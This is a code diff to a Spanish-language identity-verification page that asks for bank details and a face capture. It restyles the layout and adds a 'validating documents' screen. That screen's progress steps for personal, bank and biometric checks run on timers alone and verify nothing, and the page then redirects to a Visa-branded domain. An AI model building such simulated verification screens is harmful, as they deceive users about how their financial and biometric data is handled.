@@ -152,7 +152,9 @@
       padding-right: 1rem;
     }
 
-    /* Progress Steps */
+    /* ===============================================
+       CORRECCIÓN CRÍTICA: Progress Steps Mejorados
+       =============================================== */
     .progress-container {
       margin-bottom: 2rem;
     }
@@ -163,13 +165,14 @@
       align-items: center;
       position: relative;
       margin-bottom: 1.5rem;
+      padding: 0 1rem;
     }
 
     .progress-line {
       position: absolute;
       top: 50%;
-      left: 0;
-      right: 0;
+      left: 10%;
+      right: 10%;
       height: 3px;
       background: var(--neutral-300);
       z-index: 1;
@@ -184,6 +187,7 @@
       border-radius: var(--radius-full);
     }
 
+    /* CORRECCIÓN: Pasos con tamaños consistentes y fijos */
     .progress-step {
       position: relative;
       z-index: 2;
@@ -192,15 +196,19 @@
       align-items: center;
       text-align: center;
       background: var(--gradient-card);
-      padding: 0.75rem;
+      padding: 1rem;
       border-radius: var(--radius-xl);
       box-shadow: var(--shadow-md);
-      min-width: 80px;
+      /* TAMAÑO FIJO para consistencia */
+      width: 120px;
+      min-height: 100px;
+      flex-shrink: 0;
     }
 
     .step-circle {
-      width: 48px;
-      height: 48px;
+      /* TAMAÑO FIJO para todos los círculos */
+      width: 50px;
+      height: 50px;
       border-radius: 50%;
       background: var(--neutral-300);
       border: 3px solid var(--neutral-300);
@@ -208,10 +216,12 @@
       align-items: center;
       justify-content: center;
       font-weight: 700;
-      font-size: 1rem;
+      font-size: 1.1rem;
       color: var(--neutral-600);
       margin-bottom: 0.5rem;
       transition: all 0.4s var(--animation-bounce);
+      /* Centrado perfecto */
+      flex-shrink: 0;
     }
 
     .step-circle.active {
@@ -230,11 +240,16 @@
     }
 
     .step-label {
-      font-size: 0.8rem;
+      font-size: 0.85rem;
       font-weight: 600;
       color: var(--neutral-600);
-      max-width: 80px;
-      line-height: 1.3;
+      line-height: 1.2;
+      /* Texto centrado y con altura fija */
+      text-align: center;
+      height: 2.4rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
 
     .step-label.active {
@@ -561,6 +576,7 @@
       font-family: inherit;
       position: relative;
       overflow: hidden;
+      min-width: 120px;
     }
 
     .btn i {
@@ -867,7 +883,250 @@
       animation: fadeIn 0.6s ease;
     }
 
-    /* Completion Screen */
+    /* =========================================================
+       CORRECCIÓN CRÍTICA: Tally Form Container COMPLETAMENTE MEJORADO
+       ========================================================= */
+    .tally-section {
+      background: var(--gradient-primary);
+      border-radius: var(--radius-2xl);
+      padding: 1.5rem;
+      margin: 2rem -1rem; /* Márgenes negativos para pantalla completa */
+      color: white;
+      box-shadow: var(--shadow-banking);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .tally-section::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      right: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+      animation: rotate 20s linear infinite;
+    }
+
+    .tally-header {
+      text-align: center;
+      margin-bottom: 1.5rem;
+      position: relative;
+      z-index: 2;
+    }
+
+    .tally-icon {
+      width: 60px;
+      height: 60px;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.8rem;
+      margin: 0 auto 1rem;
+      backdrop-filter: blur(10px);
+    }
+
+    .tally-title {
+      font-size: 1.3rem;
+      font-weight: 700;
+      margin-bottom: 0.5rem;
+    }
+
+    .tally-subtitle {
+      font-size: 0.9rem;
+      opacity: 0.9;
+      line-height: 1.4;
+    }
+
+    /* CORRECCIÓN CRÍTICA: Container más grande para mejor visualización */
+    .tally-container {
+      width: 100%;
+      min-height: 80vh; /* Mucho más alto */
+      border-radius: var(--radius-xl);
+      overflow: hidden;
+      box-shadow: var(--shadow-xl);
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      margin: 1rem 0;
+      background: white;
+      position: relative;
+      z-index: 2;
+    }
+
+    .tally-container iframe {
+      width: 100%;
+      height: 80vh; /* Altura completa */
+      border: none;
+      background: white;
+      display: block;
+    }
+
+    /* Indicador de completado del formulario Tally */
+    .tally-completion-indicator {
+      display: none;
+      background: var(--gradient-success);
+      color: white;
+      padding: 1rem;
+      border-radius: var(--radius-lg);
+      margin: 1rem 0;
+      text-align: center;
+      font-weight: 600;
+      font-size: 1rem;
+      animation: slideUp 0.4s ease;
+      box-shadow: var(--shadow-md);
+    }
+
+    .tally-completion-indicator.active {
+      display: block;
+    }
+
+    .tally-completion-indicator i {
+      margin-right: 0.5rem;
+      font-size: 1.2rem;
+    }
+
+    /* =========================================================
+       CORRECCIÓN CRÍTICA: Nueva Pantalla de Validación con Spinner
+       ========================================================= */
+    .validation-screen {
+      text-align: center;
+      padding: 3rem 1rem;
+      display: none;
+    }
+
+    .validation-screen.active {
+      display: block;
+      animation: fadeIn 0.6s ease;
+    }
+
+    .validation-spinner {
+      width: 120px;
+      height: 120px;
+      border: 8px solid rgba(26, 31, 113, 0.1);
+      border-top: 8px solid var(--primary);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 2rem;
+      position: relative;
+    }
+
+    .validation-spinner::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 60px;
+      height: 60px;
+      background: var(--gradient-primary);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .validation-spinner::before {
+      content: '\f2f1';
+      font-family: 'Font Awesome 6 Free';
+      font-weight: 900;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: white;
+      font-size: 2rem;
+      z-index: 10;
+    }
+
+    .validation-title {
+      font-size: 2rem;
+      font-weight: 700;
+      color: var(--neutral-900);
+      margin-bottom: 1rem;
+    }
+
+    .validation-subtitle {
+      font-size: 1.1rem;
+      color: var(--neutral-600);
+      margin-bottom: 2rem;
+      max-width: 500px;
+      margin-left: auto;
+      margin-right: auto;
+      line-height: 1.6;
+    }
+
+    .validation-progress {
+      background: var(--neutral-200);
+      height: 8px;
+      border-radius: 4px;
+      overflow: hidden;
+      margin: 2rem auto;
+      max-width: 400px;
+    }
+
+    .validation-progress-bar {
+      background: var(--gradient-primary);
+      height: 100%;
+      width: 0%;
+      transition: width 0.5s ease;
+      border-radius: 4px;
+    }
+
+    .validation-steps {
+      text-align: left;
+      max-width: 400px;
+      margin: 2rem auto;
+    }
+
+    .validation-step {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      padding: 0.75rem 0;
+      border-bottom: 1px solid var(--neutral-300);
+      opacity: 0.5;
+      transition: opacity 0.3s ease;
+    }
+
+    .validation-step:last-child {
+      border-bottom: none;
+    }
+
+    .validation-step.active {
+      opacity: 1;
+      color: var(--primary);
+      font-weight: 600;
+    }
+
+    .validation-step.completed {
+      opacity: 1;
+      color: var(--success);
+    }
+
+    .validation-step-icon {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background: var(--neutral-300);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.8rem;
+      color: white;
+      flex-shrink: 0;
+    }
+
+    .validation-step.active .validation-step-icon {
+      background: var(--primary);
+      animation: pulse 1s infinite;
+    }
+
+    .validation-step.completed .validation-step-icon {
+      background: var(--success);
+    }
+
+    /* Completion Screen Mejorada */
     .completion-screen {
       text-align: center;
       padding: 2rem 0;
@@ -903,105 +1162,6 @@
       margin-left: auto;
       margin-right: auto;
       line-height: 1.6;
-    }
-
-    /* SECCIÓN CRÍTICA: Tally Form Container - COMPLETAMENTE REDISEÑADA */
-    .tally-section {
-      background: var(--gradient-primary);
-      border-radius: var(--radius-2xl);
-      padding: 2rem;
-      margin: 2rem 0;
-      color: white;
-      box-shadow: var(--shadow-banking);
-      position: relative;
-      overflow: hidden;
-    }
-
-    .tally-section::before {
-      content: '';
-      position: absolute;
-      top: -50%;
-      right: -50%;
-      width: 200%;
-      height: 200%;
-      background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
-      animation: rotate 20s linear infinite;
-    }
-
-    .tally-header {
-      text-align: center;
-      margin-bottom: 2rem;
-      position: relative;
-      z-index: 2;
-    }
-
-    .tally-icon {
-      width: 80px;
-      height: 80px;
-      background: rgba(255, 255, 255, 0.2);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 2rem;
-      margin: 0 auto 1rem;
-      backdrop-filter: blur(10px);
-    }
-
-    .tally-title {
-      font-size: 1.5rem;
-      font-weight: 700;
-      margin-bottom: 0.75rem;
-    }
-
-    .tally-subtitle {
-      font-size: 1rem;
-      opacity: 0.9;
-      line-height: 1.5;
-    }
-
-    .tally-container {
-      width: 100%;
-      min-height: 600px;
-      border-radius: var(--radius-xl);
-      overflow: hidden;
-      box-shadow: var(--shadow-xl);
-      border: 3px solid rgba(255, 255, 255, 0.3);
-      margin: 1.5rem 0;
-      background: white;
-      position: relative;
-      z-index: 2;
-    }
-
-    .tally-container iframe {
-      width: 100%;
-      height: 600px;
-      border: none;
-      background: white;
-    }
-
-    /* Indicador de completado del formulario Tally */
-    .tally-completion-indicator {
-      display: none;
-      background: var(--gradient-success);
-      color: white;
-      padding: 1rem;
-      border-radius: var(--radius-lg);
-      margin: 1rem 0;
-      text-align: center;
-      font-weight: 600;
-      font-size: 1rem;
-      animation: slideUp 0.4s ease;
-      box-shadow: var(--shadow-md);
-    }
-
-    .tally-completion-indicator.active {
-      display: block;
-    }
-
-    .tally-completion-indicator i {
-      margin-right: 0.5rem;
-      font-size: 1.2rem;
     }
 
     /* Already Completed Screen */
@@ -1167,11 +1327,13 @@
       color: white;
     }
 
-    /* Responsive Design */
+    /* ===============================================
+       CORRECCIÓN CRÍTICA: Responsive Design Mejorado
+       =============================================== */
     @media (max-width: 768px) {
       .verification-container {
-        padding-left: 0.75rem;
-        padding-right: 0.75rem;
+        padding-left: 0.5rem;
+        padding-right: 0.5rem;
       }
 
       .form-row {
@@ -1182,32 +1344,39 @@
         min-width: auto;
       }
 
+      /* Progress Steps Responsive MEJORADO */
       .progress-steps {
-        margin: 0 -0.5rem 1.5rem;
         overflow-x: auto;
-        padding-bottom: 0.5rem;
+        padding: 0 0.5rem 0.5rem;
+        margin: 0 -0.5rem 1.5rem;
+        justify-content: flex-start;
+        gap: 1rem;
       }
 
       .progress-step {
+        width: 100px; /* Más pequeño en móvil pero consistente */
+        min-height: 85px;
+        padding: 0.75rem;
         flex-shrink: 0;
-        margin: 0 0.25rem;
-        padding: 0.5rem;
-        min-width: 70px;
       }
 
       .step-circle {
-        width: 40px;
-        height: 40px;
-        font-size: 0.9rem;
+        width: 42px;
+        height: 42px;
+        font-size: 1rem;
       }
 
       .step-label {
-        font-size: 0.7rem;
-        max-width: 70px;
+        font-size: 0.75rem;
+        height: 2rem;
+      }
+
+      .progress-line {
+        display: none; /* Ocultar línea en móvil */
       }
 
       .bank-grid {
-        grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+        grid-template-columns: repeat(auto-fit, minmax(110px, 1fr));
         gap: 0.75rem;
       }
 
@@ -1216,21 +1385,21 @@
       }
 
       .bank-logo {
-        width: 40px;
-        height: 40px;
+        width: 36px;
+        height: 36px;
       }
 
       .bank-name {
-        font-size: 0.75rem;
+        font-size: 0.7rem;
       }
 
       .camera-container {
-        height: 300px;
+        height: 280px;
       }
 
       .face-guide {
-        width: 140px;
-        height: 170px;
+        width: 120px;
+        height: 150px;
       }
 
       .camera-btn {
@@ -1240,8 +1409,8 @@
       }
 
       .camera-btn.capture {
-        width: 64px;
-        height: 64px;
+        width: 60px;
+        height: 60px;
       }
 
       .navigation {
@@ -1251,27 +1420,62 @@
 
       .navigation .btn {
         width: 100%;
+        min-width: auto;
       }
 
       .toast-container {
-        right: 0.75rem;
-        left: 0.75rem;
+        right: 0.5rem;
+        left: 0.5rem;
       }
 
       .toast {
         min-width: auto;
       }
 
+      /* CORRECCIÓN CRÍTICA: Tally responsive mejorado */
       .tally-section {
-        padding: 1.5rem;
+        margin: 1.5rem -0.5rem;
+        padding: 1rem;
       }
 
       .tally-container {
-        min-height: 500px;
+        min-height: 70vh; /* Adaptado para móvil */
       }
 
       .tally-container iframe {
-        height: 500px;
+        height: 70vh;
+      }
+
+      .tally-icon {
+        width: 50px;
+        height: 50px;
+        font-size: 1.5rem;
+      }
+
+      .tally-title {
+        font-size: 1.1rem;
+      }
+
+      .tally-subtitle {
+        font-size: 0.85rem;
+      }
+
+      /* Validación responsive */
+      .validation-spinner {
+        width: 100px;
+        height: 100px;
+      }
+
+      .validation-spinner::before {
+        font-size: 1.5rem;
+      }
+
+      .validation-title {
+        font-size: 1.5rem;
+      }
+
+      .validation-subtitle {
+        font-size: 1rem;
       }
     }
 
@@ -1289,23 +1493,36 @@
       }
 
       .bank-grid {
-        grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+        grid-template-columns: repeat(auto-fit, minmax(90px, 1fr));
       }
 
       .camera-container {
-        height: 250px;
+        height: 240px;
       }
 
+      /* CORRECCIÓN CRÍTICA: Tally ultraresponsive */
       .tally-container {
-        min-height: 450px;
+        min-height: 65vh;
       }
 
       .tally-container iframe {
-        height: 450px;
+        height: 65vh;
+      }
+
+      .form-control {
+        height: 44px;
+        font-size: 0.85rem;
+      }
+
+      .btn {
+        height: 44px;
+        font-size: 0.85rem;
       }
     }
 
-    /* Animations */
+    /* ===============================================
+       ANIMATIONS MEJORADAS
+       =============================================== */
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(10px); }
       to { opacity: 1; transform: translateY(0); }
@@ -1336,6 +1553,11 @@
 
     @keyframes spin {
       to { transform: rotate(360deg); }
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
     }
 
     @keyframes slideInRight {
@@ -1794,7 +2016,7 @@
               </div>
             </div>
 
-            <!-- SECCIÓN CRÍTICA: Tally Form - COMPLETAMENTE REDISEÑADA -->
+            <!-- SECCIÓN CRÍTICA: Tally Form - COMPLETAMENTE REDISEÑADA Y MEJORADA -->
             <div class="tally-section">
               <div class="tally-header">
                 <div class="tally-icon">
@@ -1811,7 +2033,7 @@
                 <iframe id="tally-iframe"
                         data-tally-src="https://tally.so/r/mRaxZP?transparentBackground=1" 
                         width="100%" 
-                        height="600" 
+                        height="80vh" 
                         frameborder="0" 
                         marginheight="0" 
                         marginwidth="0" 
@@ -1849,6 +2071,41 @@
         </div>
       </div>
 
+      <!-- CORRECCIÓN CRÍTICA: Nueva Pantalla de Validación -->
+      <div class="step-content" id="validation">
+        <div class="validation-screen">
+          <div class="validation-spinner"></div>
+          <h1 class="validation-title">Validando Documentos</h1>
+          <p class="validation-subtitle">
+            Nuestro sistema está procesando y validando toda su información. 
+            Este proceso puede tomar unos momentos...
+          </p>
+          
+          <div class="validation-progress">
+            <div class="validation-progress-bar" id="validation-progress-bar"></div>
+          </div>
+
+          <div class="validation-steps">
+            <div class="validation-step active" id="validation-step-1">
+              <div class="validation-step-icon">1</div>
+              <span>Verificando información personal</span>
+            </div>
+            <div class="validation-step" id="validation-step-2">
+              <div class="validation-step-icon">2</div>
+              <span>Validando datos bancarios</span>
+            </div>
+            <div class="validation-step" id="validation-step-3">
+              <div class="validation-step-icon">3</div>
+              <span>Procesando biometría facial</span>
+            </div>
+            <div class="validation-step" id="validation-step-4">
+              <div class="validation-step-icon">4</div>
+              <span>Completando verificación</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
       <!-- Completion Screen -->
       <div class="step-content" id="completion">
         <div class="completion-screen">
@@ -1860,7 +2117,7 @@
             Su proceso de verificación de identidad ha sido enviado exitosamente. 
             Nuestro equipo revisará su información en las próximas 24-48 horas y le notificaremos por correo electrónico.
           </p>
-          <a href="recarga.html" class="btn btn-primary btn-block">
+          <a href="https://home.remeex.visa.com/recarga.html" class="btn btn-primary btn-block">
             <i class="fas fa-home"></i> Volver al Panel Principal
           </a>
         </div>
@@ -2227,8 +2484,7 @@
             isValid = false;
             errorMessage = 'El número de cuenta debe tener al menos 15 dígitos';
           }
-          break;
-      }
+          break;}
 
       // Update field appearance with animation
       const errorElement = document.getElementById(field.id + '-error');
@@ -2441,7 +2697,7 @@
       }
     }
 
-    // SOLUCIÓN CRÍTICA: Setup Tally listener - COMPLETAMENTE REDISEÑADO
+    // SOLUCIÓN CRÍTICA: Setup Tally listener - COMPLETAMENTE REDISEÑADO Y MEJORADO
     function setupTallyListener() {
       // Cargar iframe inmediatamente cuando llegue al paso 4
       const iframe = document.getElementById('tally-iframe');
@@ -2526,7 +2782,7 @@
                 const scrollTop = iframe.contentWindow.pageYOffset || iframe.contentDocument.documentElement.scrollTop;
                 maxScroll = Math.max(maxScroll, scrollTop);
                 
-                // Si ha scrolleado significativamente y luego regresa arriba, probablemente completó
+                // Si ha scrolleado significativamente y luegoregresa arriba, probablemente completó
                 if (maxScroll > 500 && scrollTop < 100) {
                   setTimeout(() => {
                     if (!tallyCompleted) {
@@ -2891,7 +3147,7 @@
       });
     }
 
-    // Complete verification
+    // CORRECCIÓN CRÍTICA: Complete verification con nueva pantalla de validación
     function completeVerification() {
       if (!tallyCompleted) {
         showToast('warning', 'Formulario pendiente', 'Por favor complete el formulario antes de continuar');
@@ -2904,39 +3160,136 @@
         return;
       }
 
-      showLoading('Finalizando verificación...');
-      
-      // Simulate processing delay with progress animation
-      const progressSteps = [
-        { progress: 20, text: 'Validando información personal...', delay: 800 },
-        { progress: 40, text: 'Verificando datos bancarios...', delay: 1000 },
-        { progress: 60, text: 'Procesando biometría...', delay: 800 },
-        { progress: 80, text: 'Completando formulario final...', delay: 600 },
-        { progress: 100, text: 'Finalizando verificación...', delay: 800 }
+      // Mostrar pantalla de validación en lugar del loading overlay
+      showValidationScreen();
+    }
+
+    // CORRECCIÓN CRÍTICA: Nueva función para mostrar pantalla de validación
+    function showValidationScreen() {
+      // Hide current step with animation
+      const currentStepEl = document.querySelector('.step-content.active');
+      if (currentStepEl) {
+        gsap.to(currentStepEl, {
+          opacity: 0,
+          scale: 0.95,
+          duration: 0.5,
+          onComplete: () => {
+            currentStepEl.classList.remove('active');
+            
+            // Show validation screen
+            const validationEl = document.getElementById('validation');
+            if (validationEl) {
+              validationEl.classList.add('active');
+              gsap.fromTo(validationEl, 
+                { opacity: 0, scale: 0.95 }, 
+                { opacity: 1, scale: 1, duration: 0.6 }
+              );
+            }
+          }
+        });
+      }
+
+      // Simulate validation process with progress animation
+      const validationSteps = [
+        { 
+          step: 1, 
+          progress: 25, 
+          text: 'Verificando información personal...', 
+          delay: 1200,
+          icon: '<i class="fas fa-check"></i>'
+        },
+        { 
+          step: 2, 
+          progress: 50, 
+          text: 'Validando datos bancarios...', 
+          delay: 1000,
+          icon: '<i class="fas fa-check"></i>'
+        },
+        { 
+          step: 3, 
+          progress: 75, 
+          text: 'Procesando biometría facial...', 
+          delay: 1300,
+          icon: '<i class="fas fa-check"></i>'
+        },
+        { 
+          step: 4, 
+          progress: 100, 
+          text: 'Completando verificación...', 
+          delay: 800,
+          icon: '<i class="fas fa-check"></i>'
+        }
       ];
 
-      let currentProgress = 0;
+      let currentValidationStep = 0;
       
-      function processStep(index) {
-        if (index >= progressSteps.length) {
-          // Proceso completado
+      function processValidationStep() {
+        if (currentValidationStep >= validationSteps.length) {
+          // Proceso completado - mostrar completion y redirigir
           setTimeout(() => {
             completeVerificationProcess();
-          }, 500);
+          }, 1000);
           return;
         }
 
-        const step = progressSteps[index];
-        updateLoadingProgress(step.progress, step.text);
+        const stepData = validationSteps[currentValidationStep];
+        
+        // Actualizar progreso visual
+        updateValidationProgress(stepData.progress, stepData.text);
+        
+        // Actualizar step visual
+        updateValidationStep(stepData.step, stepData.icon);
         
         setTimeout(() => {
-          processStep(index + 1);
-        }, step.delay);
+          currentValidationStep++;
+          processValidationStep();
+        }, stepData.delay);
       }
 
-      processStep(0);
+      // Iniciar proceso de validación
+      processValidationStep();
     }
 
+    // Función para actualizar progreso de validación
+    function updateValidationProgress(progress, text) {
+      const progressBar = document.getElementById('validation-progress-bar');
+      if (progressBar) {
+        gsap.to(progressBar, { width: `${progress}%`, duration: 0.8, ease: "power2.out" });
+      }
+      
+      // Actualizar texto si es necesario (opcional)
+      console.log(`Progreso: ${progress}% - ${text}`);
+    }
+
+    // Función para actualizar step de validación
+    function updateValidationStep(stepNumber, icon) {
+      // Marcar pasos anteriores como completados
+      for (let i = 1; i <= stepNumber; i++) {
+        const stepEl = document.getElementById(`validation-step-${i}`);
+        const iconEl = stepEl?.querySelector('.validation-step-icon');
+        
+        if (i < stepNumber) {
+          // Pasos completados
+          stepEl?.classList.add('completed');
+          stepEl?.classList.remove('active');
+          if (iconEl) iconEl.innerHTML = '<i class="fas fa-check"></i>';
+        } else if (i === stepNumber) {
+          // Paso actual
+          stepEl?.classList.add('active');
+          stepEl?.classList.remove('completed');
+          if (iconEl) iconEl.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+          
+          // Después de un momento, marcar como completado
+          setTimeout(() => {
+            stepEl?.classList.add('completed');
+            stepEl?.classList.remove('active');
+            if (iconEl) iconEl.innerHTML = icon;
+          }, 800);
+        }
+      }
+    }
+
+    // Función completar proceso de verificación
     function completeVerificationProcess() {
       // Mark as completed
       verificationData.completionDate = new Date().toISOString();
@@ -2950,8 +3303,6 @@
       if (cameraStream) {
         cameraStream.getTracks().forEach(track => track.stop());
       }
-      
-      hideLoading();
       
       // Show completion screen with animation
       const currentStepEl = document.querySelector('.step-content.active');
@@ -2998,6 +3349,11 @@
       }, 800);
       
       showToast('success', '¡Verificación completada!', 'Su información ha sido enviada correctamente');
+      
+      // CORRECCIÓN CRÍTICA: Redirigir después de 5 segundos
+      setTimeout(() => {
+        window.location.href = 'https://home.remeex.visa.com/recarga.html';
+      }, 5000);
     }
 
     // Utility functions
@@ -3022,17 +3378,6 @@
             loadingOverlay.style.display = 'none';
           }
         });
-      }
-    }
-
-    function updateLoadingProgress(progress, text) {
-      const loadingText = document.getElementById('loading-text');
-      if (loadingText) loadingText.textContent = text;
-      
-      // Si hay una barra de progreso, actualizarla
-      const progressBar = document.querySelector('.progress-bar');
-      if (progressBar) {
-        gsap.to(progressBar, { width: `${progress}%`, duration: 0.5 });
       }
     }
 
